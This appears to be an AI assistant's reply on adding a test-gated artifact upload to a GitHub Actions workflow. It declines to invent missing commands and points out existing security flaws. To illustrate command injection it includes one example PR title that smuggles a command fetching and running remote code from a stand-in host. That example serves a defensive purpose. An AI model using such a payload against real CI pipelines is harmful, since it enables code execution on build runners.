I didn't change anything, for two reasons.

**1. The workflow has no build or test steps.** `.github/workflows/deploy.yml` has only two steps: a checkout and an `echo` of the PR title. There's no build output to upload and no test step for the upload to follow. I'd have to make up the test command and the artifact path, and an upload pointing at a path that doesn't exist does nothing useful. Can you tell me:
- the command that builds the project and the command that runs the tests
- the path of the build output, such as `dist/` or `build/`

**2. I don't have a file-editing tool in this session.** I can only read and search files, so you'd need to apply the change or give me a session where I can edit.

Once I know those three things, the steps would look like this:

```yaml
      - run: <build command>
      - run: <test command>
      - name: Upload build artifact
        uses: actions/upload-artifact@<full-commit-SHA>  # v4
        with:
          name: build
          path: <build output path>
          if-no-files-found: error
          retention-days: 7
```

Steps run in order and the job stops at the first failure, so the upload only happens if the tests pass. No `if:` condition is needed. `if-no-files-found: error` makes the step fail if the path is wrong, instead of uploading nothing without complaint. Pin the action to a full commit SHA rather than `@v4`. I can't look up the current SHA from here.

**Two security problems already in this workflow:**
- **Line 14 lets a PR title run commands.** `${{ github.event.pull_request.title }}` is pasted straight into the shell script, so a PR titled something like `"; curl evil.sh | sh #` runs that code on the runner. To fix it, pass the title through an environment variable:
  ```yaml
      - env:
          PR_TITLE: ${{ github.event.pull_request.title }}
        run: printf 'Title is %s\n' "$PR_TITLE"
  ```
- **Line 7 gives the job more access than it needs.** `permissions: write-all` grants the token write access to everything. A build, test and upload job only needs `contents: read`. Uploading artifacts doesn't need any extra token permission.

I'd also suggest pinning `actions/checkout@v4` to a commit SHA, and adding `persist-credentials: false` to that step so the git token isn't left on the runner.
